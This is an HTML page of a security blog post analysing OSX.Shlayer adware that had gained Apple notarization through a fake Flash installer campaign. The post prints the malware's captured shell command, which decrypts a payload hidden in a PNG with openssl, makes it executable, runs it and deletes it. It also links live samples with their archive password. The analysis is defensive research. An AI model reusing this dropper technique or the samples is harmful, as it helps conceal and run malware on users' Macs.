<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x4E/bigSur.png />
<meta name="twitter:title" content=Apple&#32;Approved&#32;Malware />
<meta name="twitter:description" content=malicious&#32;code&#32;...now&#32;notarized!?&#32;#2020 />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Apple&#32;Approved&#32;Malware />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x4E/bigSur.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Apple Approved Malware</div>
  <div class="blogSubTitle">malicious code ...now notarized!? #2020</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / August 30, 2020</div>
  <br>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px">
    <center>Love these blog posts and/or want to support my research and tools? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/Shlayer.zip">samples</a> (&lsquo;OSX.Shlayer&rsquo;) to our malware collection (password: infect3d)</p>
<p>&hellip;please don’t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>It wasn&rsquo;t too long ago, that Apple&rsquo;s website stated:</p>
<blockquote>
"[Macs] doesn't get PC viruses. A Mac isn’t susceptible to the thousands of viruses plaguing Windows-based computers. That's thanks to built-in defenses in Mac OS X that keep you safe without any work on your part" -Apple.com
</blockquote>
<p>The &ldquo;truth&rdquo; of this nuanced statement lies in the fact that due to inherent cross-platform incompatibilities (not Apple’s “defenses”): a native Windows virus cannot directly execute on macOS.</p>
<p>However even this claim is rather subjective as was highlighted in 2019 by a Windows adware specimen <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/">targeting macOS users</a>. The adware was packaged with a cross-platform framework (Mono) that allowed Windows binaries (.exes) to &ldquo;natively&rdquo; run on macOS!</p>
<p>And, even back in 2012, thanks to Java, cross-platform malware could be found <a href="https://www.zdnet.com/article/cross-platform-malware-exploits-java-to-attack-pcs-and-macs/">targeting both Windows and macOS</a>.</p>
<p>Today, malicious code targeting macOS, unfortunately, is far too common. Kaspersky, in a 2019 report titled &ldquo;<a href="https://securelist.com/threats-to-macos-users/93116/#malicious-and-unwanted-programs-for-macos">Threats to macOS users</a>&rdquo;, noted a sharp uptick in threats targeting Macs:</p>
<img src="../images/blog/blog_0x4E/adware.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">&#34;Threats to macOS users&#34; (Kaspersky)</center>

<p>&hellip;while Malwarebytes stated in their &ldquo;<a href="https://resources.malwarebytes.com/files/2020/02/2020_State-of-Malware-Report-1.pdf">2020 State of Malware Report</a>&rdquo;:</p>
<blockquote>
"And for the first time ever, Macs outpaced Windows PCs in number of threats detected per endpoint." -Malwarebytes
</blockquote>
<img src="../images/blog/blog_0x4E/malwarebytes.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Threats per endpoint, Macs vs. Windows (Malwarebytes)</center>

<p>It is important to note these statistics include both adware (and potentially unwanted programs). And the reality is, if a Mac user is infected with malicious code, more than likely, it not going to be some advanced nationstate backdoor, but rather adware (or malware that installs various adware). Unfortunately, such adware and adware campaigns are rather prolific, and their prevalence is only increasing as Mac become ever more popular:</p>
<blockquote>
"The vast majority of threats for macOS in 2019 were in the AdWare category." -Kaspersky
</blockquote>
<p>It is also important not to underestimate the potential impact of adware, upon its victims. The noted security researcher, <a href="https://twitter.com/thomasareed">Thomas Reed</a> articulates this well in a <a href="https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/">recent writeup</a>:</p>
<blockquote>
"However, adware and PUPs can actually be far more invasive and dangerous on the Mac than “real” malware. They can intercept and decrypt all network traffic, create hidden users with static passwords, make insecure changes to system settings, and generally dig their roots deep into the system so that it is incredibly challenging to eradicate completely." -Thomas Reed
</blockquote>
<div class="note">
<p>For more on the topic of adware and its impact, see:</p>
<ul>
<li>
<p>&ldquo;<a href="https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/" class="inlineLink">Mac adware is more sophisticated and dangerous than traditional Mac malware</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://www.cyberscoop.com/osx-pirrit-cyberreason-targeting-edge-adware-malware-amit-serper/" class="inlineLink">The line between adware and malware has become increasingly blurred, researcher finds</a>&rdquo;</p>
</li>
</ul>
</div>
<p>Clearly to in order to protect both users and the perception of security, Apple had to take steps to address the ever rising tide of malicious code targeting macOS.</p>
<p>Their (most recent) answer? Code Notarization Requirements.</p>
<h3 id="notarization">Notarization</h3>
<p>The main goal of notarization is to allow Apple to &ldquo;<i>scan &hellip;software for malicious content</i>&rdquo; before it is distributed to macOS users. The idea was that malicious code would of course, not be notarized and thus the majority to attacks targeting macOS users (adware campaigns, etc) would be thwarted.</p>
<p>Apple introduced notarization requirements in macOS 10.15 (Catalina), detailing the topic in an apply named document, &ldquo;<a href="https://developer.apple.com/documentation/xcode/notarizing_macos_software_before_distribution">Notarizing macOS Software</a>&rdquo;:</p>
<a href="https://developer.apple.com/documentation/xcode/notarizing_macos_software_before_distribution">
<img src="../images/blog/blog_0x4E/docs.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

</a>
<p>In short, developers must now submit their applications to Apple before distribution to macOS users. This ensures that Apple can inspect (and approve) all software before it is allowed to run on (recent versions of) macOS:</p>
<blockquote>
"Notarization gives users more confidence that the Developer ID-signed software you distribute has been checked by Apple for malicious components." -Apple.com
</blockquote>
<p>If software has <i>not</i> been notarized, it will be blocked by macOS (with no option to run it, via the alert prompt):</p>
<img src="../images/blog/blog_0x4E/blocked.png"  width="50%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">unnotarized software: blocked!</center>

<p>The following provides a conceptual overview of the notarization process, and its impact to both malware and hacking operations:</p>
<img src="../images/blog/blog_0x4E/notarization.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>With the goal of stymieing the influx of malicious code targeting macOS, notarization seemed like a promising idea.
<br>
&hellip;sadly, not all promises are kept.</p>
<div class="note">
<p>For more on the topic of notarization see:</p>
<ul>
<li>
<p>&ldquo;<a href="https://eclecticlight.co/2020/08/28/how-notarization-works/" class="inlineLink">How notarization works</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://blog.fleetsmith.com/macos-mojave-app-notarization/" class="inlineLink">App Notarization: A Quick Primer</a>&rdquo;</p>
</li>
</ul>
</div>
<h3 id="a-notarized-adware-campaign">A Notarized Adware Campaign</h3>
<p>Many developers are familiar with the Homebrew, hosted at <a href="https://brew.sh/">brew.sh</a>:</p>
<img src="../images/blog/blog_0x4E/homebrew.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">the (legitimate) Homebrew website</center>

<p>On Friday, twitter user <a href="https://twitter.com/PokeCaptain">Peter Dantini</a> (@PokeCaptain) noticed that the website <code>homebrew.sh</code> (not to be confused with the legitimate Homebrew website <a href="%60brew.sh%60">brew.sh</a>), was hosting an active adware campaign. If a user inadvertently visited <code>homebrew.sh</code>, after various redirects an update for &ldquo;Adobe Flash Player&rdquo; would be aggressively recommended:</p>
<img src="../images/blog/blog_0x4E/installMe.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(fake) Abode Flash Player update(s)</center>

<br>
<div class="note">
<p>Kudos to Peter for uncovering this adware campaign, and sharing the details with me!</p>
<center>Mahalo Peter! 🙏🏽</center>
</div>
<p>Normally such campaigns are rather prosaic and utilize <em>unnotarized</em> code. As such, they are normally stopped short in their tracks by Apple&rsquo;s new notarization requirements.
For example here, we have a similar adware campaign leveraging <em>unnotarized</em> payloads &hellip;that, as expected macOS will block:</p>
<img src="../images/blog/blog_0x4E/blockedAgain.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">unnotarized adware? blocked! </center>

<br>
<div class="note">
<p>Note that in the above alert, the only options are &ldquo;Move to Trash&rdquo; and &ldquo;Cancel&rdquo;.
<br>
<br>
There is no option to allow the user to run the unnotarized software.</p>
</div>
<p>Interestingly, Peter noticed the campaign originating from <code>homebrew.sh</code>, leveraged adware payloads were actually fully notarized! 😱</p>
<p>We can confirm the payloads are indeed notarized via the <code>spctl</code> command (note the <code>&quot;source=Notarized Developer ID&quot;</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ spctl -a -vvv -t install /Volumes/Install/Installer.app 
/Volumes/Install/Installer.app: accepted
source=Notarized Developer ID
origin=Developer ID Application: Morgan Sipe (4X5KZ42L4B)

$ spctl -a -vvv -t install /Users/patrick/Downloads/Player.pkg 
/Users/patrick/Downloads/Player.pkg: accepted
source=Notarized Developer ID
origin=Developer ID Installer: Darien Watkins (NC43XU5Z95)
</pre>
</div>
<p><br>
As far as I know, this is a first: <strong>malicious code gaining Apple&rsquo;s notarization &ldquo;stamp of approval&rdquo;</strong>.</p>
<p>What does this mean?</p>
<ul>
<li>
<p>These malicious payloads were submitted to Apple, prior to distribution.</p>
</li>
<li>
<p>Apple scanned and apparently detecting no malice, (inadvertently) notarized them.</p>
</li>
<li>
<p>Now notarized, these malicious payloads are allowed to run &hellip;even on macOS Big Sur.</p>
</li>
<li>
<p>Again, due to their notarization status, users will (quite likely), fully trust these malicious samples.</p>
</li>
</ul>
<br>
<img src="../images/blog/blog_0x4E/bigSur.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">notarized malware on Big Sur? ...yups</center>

<!--
<center>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://player.vimeo.com/video/452897280" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
</div>

</center>

-->
<h3 id="triaging-the-payloads">Triaging the Payloads</h3>
<p>So what are the notarized payloads?</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ shasum *
43a44d4f58774157857d04d67a9fef7045dacb2f  AdobeFlashPlayer.dmg
d28d75c9f61d20aa990e80e88ed8f3deb37b7f7f  AdobeFlashPlayerInstaller.dmg
52873957878e37d412cd5dabddfb770bcbdf5783  MediaPlayer.dmg
b801963a180d253741be08dfbb7a5ed27964ac14  Player.pkg
</pre>
</div>
<p>&hellip;they appear to be, the rather infamous <code>OSX.Shlayer</code> malware.</p>
<p>Running the (notarized) payloads in an instrumented virtual machine captures (via our open-source <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">ProcessMonitor</a>), the execution of various shell commands via <code>bash</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "signing info (computed)" : {
      "signatureID" : "com.apple.bash",
       ...
      ]
    },
    "uid" : 501,
    "arguments" : [
      "sh",
      "-c",
      "tail -c +1381 \"/Volumes/Install/Installer.app/Contents/Resources/main.png\" | openssl enc -aes-256-cbc -salt -md md5 -d -A -base64 -out /tmp/ZQEifWNV2l -pass \"pass:0.6effariGgninthgiL0.6\" && chmod 777 /tmp/ZQEifWNV2l && /tmp/ZQEifWNV2l \"/Volumes/Install/Installer.app/Contents/MacOS/pine\" && rm -rf /tmp/ZQEifWNV2l"
    ],
    "ppid" : 1447,
    "pid" : 1546
  },
  "timestamp" : "1399-06-04 08:18:33 +0000"
}

</pre>
</div>
<p>Let&rsquo;s break down these commands:</p>
<ul>
<li>
<p><code>tail -c +1381 \&quot;/Volumes/Install/Installer.app/Contents/Resources/main.png\&quot;</code>
<br>
Extracts bytes from <code>main.png</code> starting at offset <code>1381</code></p>
</li>
<li>
<p><code>openssl enc -aes-256-cbc -salt -md md5 -d -A -base64 -out /tmp/ZQEifWNV2l -pass \&quot;pass:0.6effariGgninthgiL0.6\</code>
<br>
Decodes the output from the <code>tail</code> command into a file: <code>/tmp/ZQEifWNV2l</code></p>
</li>
<li>
<p><code>chmod 777 /tmp/ZQEifWNV2l</code>
<br>
Changes the file mode, to (amongst other things) fully accessible and executable.</p>
</li>
<li>
<p><code>/tmp/ZQEifWNV2l \&quot;/Volumes/Install/Installer.app/Contents/MacOS/pine\&quot;</code>
<br>
Executes the file <code>ZQEifWNV2l</code>, passing in <code>Installer.app/...</code> as a command line argument.</p>
</li>
<li>
<p><code>rm -rf /tmp/ZQEifWNV2l</code>
<br>
Deletes the <code>ZQEifWNV2l</code> file.</p>
</li>
</ul>
<p>The use of <code>openssl</code> in this manner is a clear indicator of <code>OSX.Shlayer</code> (as is the use of fake Flash installers, and other IoCs).</p>
<div class="note">
<p>Older variants of OSX.Shlayer used a slightly different syntax:</p>
<p>openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:2833846567 &lt;&quot;$fileDir&quot;/Resources/enc</p>
</div>
<p><code>OSX.Shlayer</code> is massively common, with <a href="https://securelist.com/threats-to-macos-users/93116/#malicious-and-unwanted-programs-for-macos">Kaspersky noting</a> it may be the most prevalent malware infecting macOS systems:</p>
<blockquote>
"As for the malware threats, the Shlayer family, which masquerades as Adobe Flash Player or an update for it, has been the most prevalent." -Kaspersky
</blockquote>
<p>And what is the ultimate goal of <code>OSX.Shlayer</code>? As noted in my <a href="https://objective-see.com/blog/blog_0x3C.html#Shlayer">previous analysis</a> of this malware:</p>
<blockquote>
"The goal of the malware [OSX.Shlayer] is to download and persistently install various macOS adware." -The Mac Malware of 2018 (OSX.Shlayer)
</blockquote>
<br>
<p>Recall this variant of <code>OSX.Shlayer</code> decoded and executed a binary named <code>ZQEifWNV2l</code>.
Uploading and scanning the <code>ZQEifWNV2l</code> file on VirusTotal, confirms that it is indeed adware:
<img src="../images/blog/blog_0x4E/bundlore.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.Shlayer&#39;s payload? Bundlore</center>
</p>
<p>&hellip;specifically (a variant?) of the persistent <code>Bundlore</code> adware.</p>
<p><code>OSX.Shlayer</code> has been known to be <a href="https://appleinsider.com/articles/20/06/18/new-mac-malware-uses-novel-tactic-to-bypass-macos-catalina-security">quite innovative</a> (i.e. with manual methods of bypassing recent macOS security mechanism):</p>
<img src="../images/blog/blog_0x4E/shlayer.png"  width="100%" class="center" style="border-radius: 4px;">

<p>As such, it not too surprising that this insidious malware has continued to evolve to trivially side-step Apple&rsquo;s best efforts.</p>
<div class="note">
<p>For more on OSX.Shlayer, see:</p>
<ul>
<li>
<p>&ldquo;<a href="http://www.cs.tufts.edu/comp/116/archive/spring2018/mnguyen.pdf" class="inlineLink">A Poisoned Apple: The Analysis of macOS Malware Shlayer</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://www.carbonblack.com/blog/vmware-carbon-black-tau-threat-analysis-shlayer-macos/" class="inlineLink">VMware Carbon Black TAU Threat Analysis: Shlayer (macOS)</a>&rdquo;</p>
</li>
</ul>
</div> 
<h3 id="conclusion">Conclusion</h3>
<p>In Apple&rsquo;s own words, notarization was supposed to &ldquo;<i>give users more confidence that [software] &hellip;has been checked by Apple for malicious components.</i>&rdquo;</p>
<p>Unfortunately a system that promises trust, yet fails to deliver, may ultimately put users at more risk. How so? If Mac users buy into Apple&rsquo;s claims, they are likely to fully trust any and all notarized software. This is extremely problematic as known malicious software (such as <code>OSX.Shlayer</code>) is already (trivially?) gaining such notarization!</p>
<p>To Apple&rsquo;s credit, once I reported the notarized payloads, they were quick to revoked their certificates (and thus rescind their notarization status):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ spctl -a -vvv -t install /Volumes/Install/Installer.app 

/Volumes/Install/Installer.app: notarization indicates this code has been revoked
</pre>
</div>
<p>Thus, these malicious payloads will now, no longer run on macOS. Hooray!</p>
<img src="../images/blog/blog_0x4E/revoked.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(previously notarized) payloads, now blocked!</center>

<p>&hellip;still, the fact that known malware got notarized in the first place, raises many questions 🤔</p>
<h3 id="update">Update</h3>
<p>As noted, Apple (quickly-ish) revoked the Developer code-signing certificate(s) that were used to sign the malicious payloads. This occurred on Friday, Aug. 28th.</p>
<p>Interestingly, as of Sunday (Aug 30th) the adware campaign was still live and serving up new payloads. Unfortunately these new payloads are (still) notarized:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ spctl -a -vvv -t install /Volumes/Installer/Installer.app 
/Volumes/Installer/Installer.app: accepted
source=Notarized Developer ID
origin=Developer ID Application: Aimee Shorter (73KF97486K)
</pre>
</div>
<p>Which means even on Big Sur, they will (still) be allowed to run:</p>
<img src="../images/blog/blog_0x4E/new.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Big Sur, prompts, but allows</center>

<p>If we extract the code-signing time stamp, we can see this (new) payload was signed on Friday PM (<code>Aug 28, 2020 at 1:04:04 PM HST</code>) &hellip;likely after Apple&rsquo;s initial &ldquo;response&rdquo;?</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvvv /Volumes/Installer/Installer.app 
Executable=/Volumes/Installer/Installer.app/Contents/MacOS/Ethernet
Identifier=com.Ethernet.bundle.installer
Format=app bundle with Mach-O thin (x86_64)
...
Authority=Developer ID Application: Aimee Shorter (73KF97486K)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=Aug 28, 2020 at 1:04:04 PM
</pre>
</div>
<p>Both the old and &ldquo;new&rdquo; payload(s) appears to be nearly identical, containing <code>OSX.Shlayer</code> packaged with the <code>Bundlore</code> adware.</p>
<p>However the attackers&rsquo; ability to agilely continue their attack (with other notarized payloads) is noteworthy. Clearly in the never ending cat &amp; mouse game between the attackers and Apple, the attackers are currently (still) winning. 😢</p>
<br>
<h3 id="-support-us">💕 Support Us:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>